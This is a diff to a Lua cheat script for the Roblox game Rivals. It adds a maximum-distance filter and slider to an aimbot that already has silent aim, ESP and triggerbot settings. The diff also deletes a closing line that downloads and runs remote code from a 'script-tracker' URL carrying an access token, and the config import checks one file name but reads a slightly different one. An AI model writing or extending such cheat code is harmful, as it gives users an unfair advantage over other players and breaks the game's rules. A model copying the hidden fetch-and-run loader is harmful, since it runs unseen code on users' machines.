@@ -260,16 +260,30 @@ do
         Title = string.format("%s Free", string.format(MonthlyLabels[os.date("*t").month], "Rivals Fanclub")),
         Content = "Rivals Fanclub\nhttps://discord.gg/uGxSYkyp66"
     })
+Configuration.MaxTrackingDistance = ImportedConfiguration["MaxTrackingDistance"] or 1000
 
     local AimbotSection = Tabs.Aimbot:AddSection("Aimbot")
 
-    local AimbotToggle = AimbotSection:AddToggle("Aimbot", { Title = "Aimbot", Description = "Toggles the Aimbot", Default = Configuration.Aimbot })
-    AimbotToggle:OnChanged(function(Value)
-        Configuration.Aimbot = Value
-        if not IsComputer then
-            Aiming = Value
-        end
-    end)
+local AimbotToggle = AimbotSection:AddToggle("Aimbot", { Title = "Aimbot", Description = "Toggles the Aimbot", Default = Configuration.Aimbot })
+AimbotToggle:OnChanged(function(Value)
+    Configuration.Aimbot = Value
+    if not IsComputer then
+        Aiming = Value
+    end
+end)
+
+-- Add the Max Tracking Distance Slider
+AimbotSection:AddSlider("MaxTrackingDistance", {
+    Title = "Max Tracking Distance",
+    Description = "Sets the maximum distance the aimbot can track (in studs)",
+    Default = Configuration.MaxTrackingDistance,
+    Min = 1,
+    Max = 5000,  -- You can adjust the max value as needed
+    Rounding = 1,
+    Callback = function(Value)
+        Configuration.MaxTrackingDistance = Value
+    end
+})
 
     if IsComputer then
         local OnePressAimingModeToggle = AimbotSection:AddToggle("OnePressAimingMode", { Title = "One-Press Mode", Description = "Uses the One-Press Mode instead of the Holding Mode", Default = Configuration.OnePressAimingMode })
@@ -1716,171 +1730,171 @@ if DEBUG or (getfenv().Drawing and getfenv().Drawing.new) then
     })
 
     if getfenv().isfile and getfenv().readfile and getfenv().writefile and getfenv().delfile then
-        local ConfigurationManager = Tabs.Settings:AddSection("Configuration Manager")
+local ConfigurationManager = Tabs.Settings:AddSection("Configuration Manager")
 
-        local AutoImportToggle = ConfigurationManager:AddToggle("AutoImport", { Title = "Auto Import", Description = "Toggles the Auto Import", Default = UISettings.AutoImport })
-        AutoImportToggle:OnChanged(function(Value)
-            UISettings.AutoImport = Value
-            InterfaceManager:ExportSettings()
+local AutoImportToggle = ConfigurationManager:AddToggle("AutoImport", { Title = "Auto Import", Description = "Toggles the Auto Import", Default = UISettings.AutoImport })
+AutoImportToggle:OnChanged(function(Value)
+    UISettings.AutoImport = Value
+    InterfaceManager:ExportSettings()
+end)
+
+ConfigurationManager:AddParagraph({
+    Title = string.format("Manager for %s", game.Name),
+    Content = string.format("Universe ID is %s", game.GameId)
+})
+
+ConfigurationManager:AddButton({
+    Title = "Import Configuration File",
+    Description = "Loads the Game Configuration File",
+    Callback = function()
+        xpcall(function()
+            if getfenv().isfile(string.format("%s.alwaysmesmerizingyou", game.GameId)) and getfenv().readfile(string.format("%s.alwaysmesmerizingyouz", game.GameId)) then
+                local ImportedConfiguration = HttpService:JSONDecode(getfenv().readfile(string.format("%s.alwaysmesmerizingyouz", game.GameId)))
+                for Key, Value in next, ImportedConfiguration do
+                    if Key == "AimKey" or Key == "SpinKey" or Key == "TriggerKey" or Key == "FoVKey" or Key == "ESPKey" then
+                        Fluent.Options[Key]:SetValue(Value)
+                        Configuration[Key] = Value ~= "RMB" and Enum.KeyCode[Value] or Enum.UserInputType.MouseButton2
+                    elseif Key == "AimPart" or Key == "SpinPart" or typeof(Configuration[Key]) == "table" then
+                        Configuration[Key] = Value
+                    elseif Key == "FoVColour" or Key == "NameESPOutlineColour" or Key == "ESPColour" then
+                        Fluent.Options[Key]:SetValueRGB(ColorsHandler:UnpackColour(Value))
+                    elseif Configuration[Key] ~= nil and Fluent.Options[Key] then
+                        Fluent.Options[Key]:SetValue(Value)
+                    end
+                end
+                for Key, Option in next, Fluent.Options do
+                    if Option.Type == "Dropdown" then
+                        if Key == "SilentAimMethods" then
+                            local Methods = {}
+                            for _, Method in next, Configuration.SilentAimMethods do
+                                Methods[Method] = true
+                            end
+                            Option:SetValue(Methods)
+                        elseif Key == "AimPart" then
+                            Option:SetValues(Configuration.AimPartDropdownValues)
+                            Option:SetValue(Configuration.AimPart)
+                        elseif Key == "SpinPart" then
+                            Option:SetValues(Configuration.SpinPartDropdownValues)
+                            Option:SetValue(Configuration.SpinPart)
+                        elseif Key == "IgnoredPlayers" then
+                            Option:SetValues(Configuration.IgnoredPlayersDropdownValues)
+                            local Players = {}
+                            for _, Player in next, Configuration.IgnoredPlayers do
+                                Players[Player] = true
+                            end
+                            Option:SetValue(Players)
+                        elseif Key == "TargetPlayers" then
+                            Option:SetValues(Configuration.TargetPlayersDropdownValues)
+                            local Players = {}
+                            for _, Player in next, Configuration.TargetPlayers do
+                                Players[Player] = true
+                            end
+                            Option:SetValue(Players)
+                        end
+                    end
+                end
+                Window:Dialog({
+                    Title = "Configuration Manager",
+                    Content = string.format("Configuration File %s.alwaysmesmerizingyou has been successfully loaded!", game.GameId),
+                    Buttons = {
+                        {
+                            Title = "Confirm"
+                        }
+                    }
+                })
+            else
+                Window:Dialog({
+                    Title = "Configuration Manager",
+                    Content = string.format("Configuration File %s.alwaysmesmerizingyou could not be found!", game.GameId),
+                    Buttons = {
+                        {
+                            Title = "Confirm"
+                        }
+                    }
+                })
+            end
+        end, function()
+            Window:Dialog({
+                Title = "Configuration Manager",
+                Content = string.format("An Error occurred when loading the Configuration File %s.alwaysmesmerizingyou", game.GameId),
+                Buttons = {
+                    {
+                        Title = "Confirm"
+                    }
+                }
+            })
         end)
+    end
+})
 
-        ConfigurationManager:AddParagraph({
-            Title = string.format("Manager for %s", game.Name),
-            Content = string.format("Universe ID is %s", game.GameId)
-        })
-
-        ConfigurationManager:AddButton({
-            Title = "Import Configuration File",
-            Description = "Loads the Game Configuration File",
-            Callback = function()
-                xpcall(function()
-                    if getfenv().isfile(string.format("%s.alwaysmesmerizingyou", game.GameId)) and getfenv().readfile(string.format("%s.alwaysmesmerizingyouz", game.GameId)) then
-                        local ImportedConfiguration = HttpService:JSONDecode(getfenv().readfile(string.format("%s.alwaysmesmerizingyouz", game.GameId)))
-                        for Key, Value in next, ImportedConfiguration do
-                            if Key == "AimKey" or Key == "SpinKey" or Key == "TriggerKey" or Key == "FoVKey" or Key == "ESPKey" then
-                                Fluent.Options[Key]:SetValue(Value)
-                                Configuration[Key] = Value ~= "RMB" and Enum.KeyCode[Value] or Enum.UserInputType.MouseButton2
-                            elseif Key == "AimPart" or Key == "SpinPart" or typeof(Configuration[Key]) == "table" then
-                                Configuration[Key] = Value
-                            elseif Key == "FoVColour" or Key == "NameESPOutlineColour" or Key == "ESPColour" then
-                                Fluent.Options[Key]:SetValueRGB(ColorsHandler:UnpackColour(Value))
-                            elseif Configuration[Key] ~= nil and Fluent.Options[Key] then
-                                Fluent.Options[Key]:SetValue(Value)
-                            end
-                        end
-                        for Key, Option in next, Fluent.Options do
-                            if Option.Type == "Dropdown" then
-                                if Key == "SilentAimMethods" then
-                                    local Methods = {}
-                                    for _, Method in next, Configuration.SilentAimMethods do
-                                        Methods[Method] = true
-                                    end
-                                    Option:SetValue(Methods)
-                                elseif Key == "AimPart" then
-                                    Option:SetValues(Configuration.AimPartDropdownValues)
-                                    Option:SetValue(Configuration.AimPart)
-                                elseif Key == "SpinPart" then
-                                    Option:SetValues(Configuration.SpinPartDropdownValues)
-                                    Option:SetValue(Configuration.SpinPart)
-                                elseif Key == "IgnoredPlayers" then
-                                    Option:SetValues(Configuration.IgnoredPlayersDropdownValues)
-                                    local Players = {}
-                                    for _, Player in next, Configuration.IgnoredPlayers do
-                                        Players[Player] = true
-                                    end
-                                    Option:SetValue(Players)
-                                elseif Key == "TargetPlayers" then
-                                    Option:SetValues(Configuration.TargetPlayersDropdownValues)
-                                    local Players = {}
-                                    for _, Player in next, Configuration.TargetPlayers do
-                                        Players[Player] = true
-                                    end
-                                    Option:SetValue(Players)
-                                end
-                            end
-                        end
-                        Window:Dialog({
-                            Title = "Configuration Manager",
-                            Content = string.format("Configuration File %s.alwaysmesmerizingyou has been successfully loaded!", game.GameId),
-                            Buttons = {
-                                {
-                                    Title = "Confirm"
-                                }
-                            }
-                        })
-                    else
-                        Window:Dialog({
-                            Title = "Configuration Manager",
-                            Content = string.format("Configuration File %s.alwaysmesmerizingyou could not be found!", game.GameId),
-                            Buttons = {
-                                {
-                                    Title = "Confirm"
-                                }
-                            }
-                        })
-                    end
-                end, function()
-                    Window:Dialog({
-                        Title = "Configuration Manager",
-                        Content = string.format("An Error occurred when loading the Configuration File %s.alwaysmesmerizingyou", game.GameId),
-                        Buttons = {
-                            {
-                                Title = "Confirm"
-                            }
-                        }
-                    })
-                end)
-            end
-        })
-
-        ConfigurationManager:AddButton({
-            Title = "Export Configuration File",
-            Description = "Overwrites the Game Configuration File",
-            Callback = function()
-                xpcall(function()
-                    local ExportedConfiguration = { __LAST_UPDATED__ = os.date() }
-                    for Key, Value in next, Configuration do
-                        if Key == "AimKey" or Key == "SpinKey" or Key == "TriggerKey" or Key == "FoVKey" or Key == "ESPKey" then
-                            ExportedConfiguration[Key] = Fluent.Options[Key].Value
-                        elseif Key == "FoVColour" or Key == "NameESPOutlineColour" or Key == "ESPColour" then
-                            ExportedConfiguration[Key] = ColorsHandler:PackColour(Value)
-                        else
-                            ExportedConfiguration[Key] = Value
-                        end
-                    end
-                    ExportedConfiguration = HttpService:JSONEncode(ExportedConfiguration)
-                    getfenv().writefile(string.format("%s.alwaysmesmerizingyou", game.GameId), ExportedConfiguration)
-                    Window:Dialog({
-                        Title = "Configuration Manager",
-                        Content = string.format("Configuration File %s.alwaysmesmerizingyou has been successfully overwritten!", game.GameId),
-                        Buttons = {
-                            {
-                                Title = "Confirm"
-                            }
-                        }
-                    })
-                end, function()
-                    Window:Dialog({
-                        Title = "Configuration Manager",
-                        Content = string.format("An Error occurred when overwriting the Configuration File %s.alwaysmesmerizingyou", game.GameId),
-                        Buttons = {
-                            {
-                                Title = "Confirm"
-                            }
-                        }
-                    })
-                end)
-            end
-        })
-
-        ConfigurationManager:AddButton({
-            Title = "Delete Configuration File",
-            Description = "Removes the Game Configuration File",
-            Callback = function()
-                if getfenv().isfile(string.format("%s.alwaysmesmerizingyou", game.GameId)) then
-                    getfenv().delfile(string.format("%s.alwaysmesmerizingyou", game.GameId))
-                    Window:Dialog({
-                        Title = "Configuration Manager",
-                        Content = string.format("Configuration File %s.alwaysmesmerizingyou has been successfully removed!", game.GameId),
-                        Buttons = {
-                            {
-                                Title = "Confirm"
-                            }
-                        }
-                    })
+ConfigurationManager:AddButton({
+    Title = "Export Configuration File",
+    Description = "Overwrites the Game Configuration File",
+    Callback = function()
+        xpcall(function()
+            local ExportedConfiguration = { __LAST_UPDATED__ = os.date() }
+            for Key, Value in next, Configuration do
+                if Key == "AimKey" or Key == "SpinKey" or Key == "TriggerKey" or Key == "FoVKey" or Key == "ESPKey" then
+                    ExportedConfiguration[Key] = Fluent.Options[Key].Value
+                elseif Key == "FoVColour" or Key == "NameESPOutlineColour" or Key == "ESPColour" then
+                    ExportedConfiguration[Key] = ColorsHandler:PackColour(Value)
                 else
-                    Window:Dialog({
-                        Title = "Configuration Manager",
-                        Content = string.format("Configuration File %s.alwaysmesmerizingyouz could not be found!", game.GameId),
-                        Buttons = {
-                            {
-                                Title = "Confirm"
-                            }
-                        }
-                    })
+                    ExportedConfiguration[Key] = Value
                 end
             end
-        })
+            ExportedConfiguration = HttpService:JSONEncode(ExportedConfiguration)
+            getfenv().writefile(string.format("%s.alwaysmesmerizingyou", game.GameId), ExportedConfiguration)
+            Window:Dialog({
+                Title = "Configuration Manager",
+                Content = string.format("Configuration File %s.alwaysmesmerizingyou has been successfully overwritten!", game.GameId),
+                Buttons = {
+                    {
+                        Title = "Confirm"
+                    }
+                }
+            })
+        end, function()
+            Window:Dialog({
+                Title = "Configuration Manager",
+                Content = string.format("An Error occurred when overwriting the Configuration File %s.alwaysmesmerizingyou", game.GameId),
+                Buttons = {
+                    {
+                        Title = "Confirm"
+                    }
+                }
+            })
+        end)
+    end
+})
+
+ConfigurationManager:AddButton({
+    Title = "Delete Configuration File",
+    Description = "Removes the Game Configuration File",
+    Callback = function()
+        if getfenv().isfile(string.format("%s.alwaysmesmerizingyou", game.GameId)) then
+            getfenv().delfile(string.format("%s.alwaysmesmerizingyou", game.GameId))
+            Window:Dialog({
+                Title = "Configuration Manager",
+                Content = string.format("Configuration File %s.alwaysmesmerizingyou has been successfully removed!", game.GameId),
+                Buttons = {
+                    {
+                        Title = "Confirm"
+                    }
+                }
+            })
+        else
+            Window:Dialog({
+                Title = "Configuration Manager",
+                Content = string.format("Configuration File %s.alwaysmesmerizingyouz could not be found!", game.GameId),
+                Buttons = {
+                    {
+                        Title = "Confirm"
+                    }
+                }
+            })
+        end
+    end
+})
     else
         ShowWarning = true
     end
@@ -2680,12 +2694,15 @@ local AimbotLoop; AimbotLoop = RunService[UISettings.RenderingMode]:Connect(func
             if not IsReady(OldTarget) then
                 if OldTarget and not Configuration.OffAimbotAfterKill or not OldTarget then
                     for _, _Player in next, Players:GetPlayers() do
-                        local IsCharacterReady, Character, PartViewportPosition = IsReady(_Player.Character)
+                        local IsCharacterReady, Character, PartViewportPosition, PartWorldPosition = IsReady(_Player.Character)
                         if IsCharacterReady and PartViewportPosition[2] then
-                            local Magnitude = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(PartViewportPosition[1].X, PartViewportPosition[1].Y)).Magnitude
-                            if Magnitude <= Closest and Magnitude <= (Configuration.FoVCheck and Configuration.FoVRadius or Closest) then
-                                Target = Character
-                                Closest = Magnitude
+                            local Distance = (PartWorldPosition - Player.Character:FindFirstChild("HumanoidRootPart").Position).Magnitude
+                            if Distance <= Configuration.MaxTrackingDistance then
+                                local Magnitude = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(PartViewportPosition[1].X, PartViewportPosition[1].Y)).Magnitude
+                                if Magnitude <= Closest and Magnitude <= (Configuration.FoVCheck and Configuration.FoVRadius or Closest) then
+                                    Target = Character
+                                    Closest = Magnitude
+                                end
                             end
                         end
                     end
@@ -2721,5 +2738,3 @@ local AimbotLoop; AimbotLoop = RunService[UISettings.RenderingMode]:Connect(func
         end
     end
 end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Patheticcs/script-tracker/refs/heads/main/main.lua?token=GHSAT0AAAAAADALV7AC56E6CPYLE6CII326Z6XSYXQ",true))()
